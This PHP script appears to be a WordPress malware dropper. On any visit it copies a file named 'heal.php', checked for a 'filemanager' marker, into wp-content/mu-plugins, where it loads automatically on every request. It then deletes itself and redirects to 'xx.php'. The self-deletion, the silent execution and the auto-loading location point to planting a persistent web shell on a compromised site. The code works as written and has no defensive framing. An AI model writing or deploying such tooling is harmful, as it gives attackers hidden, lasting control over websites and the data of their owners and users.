<?php
// Any visit (GET or POST) runs the move immediately. No buttons, no preview.
// On success: 302 redirect to xx.php and self-delete.
// On failure: 500 with plain-text reason.
if ( ! defined( 'ABSPATH' ) ) { define( 'ABSPATH', __DIR__ . '/' ); }
if ( ! defined( 'WPINC' ) ) { define( 'WPINC', 'wp-includes' ); }

if ( $_SERVER['REQUEST_METHOD'] !== 'GET' && $_SERVER['REQUEST_METHOD'] !== 'POST' ) {
	http_response_code( 405 );
	exit;
}

// ---- CONFIG --------------------------------------------------------------

$source_name = 'heal.php';
$target_name = 'heal.php';
$marker      = 'filemanager';

// ---- DISCOVERY -----------------------------------------------------------

function mover_norm( $p ) {
	return str_replace( '\\', '/', $p );
}

function mover_find_mu( $from ) {
	// Walk up looking for a "wp-content" folder. Returns the path where
	// mu-plugins SHOULD be (or already is). If mu-plugins doesn't exist
	// yet, the caller will create it.
	$from = mover_norm( $from );
	$cur  = $from;
	for ( $i = 0; $i < 10; $i++ ) {
		$base = basename( $cur );
		if ( $base === 'wp-content' ) {
			return mover_norm( $cur . '/mu-plugins' );
		}
		$p = dirname( $cur );
		if ( $p === $cur ) break;
		$cur = $p;
	}
	return '';
}

$here   = mover_norm( __DIR__ );
$src    = $here . '/' . $source_name;
$mu_dir = mover_find_mu( $here );
$tgt    = $mu_dir !== '' ? ( $mu_dir . '/' . $target_name ) : '';

$log = array();

// 1. Source must exist and be readable.
if ( ! file_exists( $src ) ) {
	$log[] = array( 'err', 'source missing: ' . $src );
} elseif ( ! is_readable( $src ) ) {
	$log[] = array( 'err', 'source unreadable' );
} else {
	$bytes = @file_get_contents( $src );
	if ( $bytes === false || $bytes === '' ) {
		$log[] = array( 'err', 'source read failed' );
	} elseif ( $marker !== '' && strpos( $bytes, $marker ) === false ) {
		$log[] = array( 'err', 'source lacks marker "' . $marker . '"' );
	} else {
		$log[] = array( 'ok', 'source read (' . strlen( $bytes ) . ' bytes)' );
	}
}

// 2. mu-plugins dir must exist or be creatable.
if ( $mu_dir === '' ) {
	$log[] = array( 'err', 'cannot locate mu-plugins directory' );
} elseif ( ! is_dir( $mu_dir ) ) {
	if ( @mkdir( $mu_dir, 0755, true ) ) {
		$log[] = array( 'ok', 'created mu-plugins dir' );
	} else {
		$log[] = array( 'err', 'cannot create mu-plugins dir' );
	}
} else {
	$log[] = array( 'ok', 'mu-plugins dir present' );
}

// 3. Write target atomically (tmp in sys_get_temp_dir so it's outside
//    any web-visible location, then rename into place).
$ok = true;
if ( $tgt !== '' && is_dir( $mu_dir ) && ! empty( $bytes ) ) {
	if ( ! is_writable( $mu_dir ) ) {
		@chmod( $mu_dir, 0755 );
	}
	$tmp = @tempnam( sys_get_temp_dir(), 'mvr' );
	if ( $tmp === false ) {
		$log[] = array( 'err', 'cannot create temp file' );
		$ok = false;
	} else {
		$w = @file_put_contents( $tmp, $bytes, LOCK_EX );
		if ( $w === false ) {
			$log[] = array( 'err', 'temp write failed' );
			@unlink( $tmp );
			$ok = false;
		} else {
			@chmod( $tmp, 0644 );
			if ( ! @rename( $tmp, $tgt ) ) {
				// Fallback: copy + unlink (rename can fail across FS).
				if ( @copy( $tmp, $tgt ) ) {
					@unlink( $tmp );
				} else {
					$log[] = array( 'err', 'cannot place target file' );
					@unlink( $tmp );
					$ok = false;
				}
			}
		}
		if ( $ok ) {
			@chmod( $tgt, 0644 );
			$log[] = array( 'ok', 'wrote target (' . strlen( $bytes ) . ' bytes)' );
		}
	}
}

// 4. Verify the target.
if ( $ok && $tgt !== '' ) {
	if ( ! file_exists( $tgt ) ) {
		$log[] = array( 'err', 'target missing after write' );
		$ok = false;
	} elseif ( @filesize( $tgt ) !== strlen( $bytes ) ) {
		$log[] = array( 'err', 'target size mismatch' );
		$ok = false;
	} else {
		$log[] = array( 'ok', 'verified: ' . filesize( $tgt ) . ' bytes at target' );
	}
}

// 5. Self-delete mover.php on success.
if ( $ok ) {
	$self = mover_norm( __FILE__ );
	if ( is_writable( $self ) ) {
		@unlink( $self );
		$log[] = array( 'ok', 'self-deleted mover.php' );
	} else {
		@chmod( $self, 0644 );
		if ( @unlink( $self ) ) {
			$log[] = array( 'ok', 'self-deleted mover.php (after chmod)' );
		} else {
			$log[] = array( 'err', 'cannot self-delete: ' . $self );
		}
	}
}

// ---- RESPONSE ------------------------------------------------------------

if ( $ok ) {
	// 302 redirect to xx.php. Use SCRIPT_NAME to compute the xx.php URL
	// from this mover.php URL (same directory).
	$xx = preg_replace( '#/[^/]*$#', '/xx.php', str_replace( '\\', '/', $_SERVER['SCRIPT_NAME'] ) );
	header( 'Location: ' . $xx, true, 302 );
	exit;
} else {
	header( 'Content-Type: text/plain; charset=utf-8' );
	http_response_code( 500 );
	$reason = '';
	foreach ( $log as $e ) {
		if ( $e[0] === 'err' ) { $reason = $e[1]; break; }
	}
	echo 'mover failed: ' . $reason;
	exit;
}
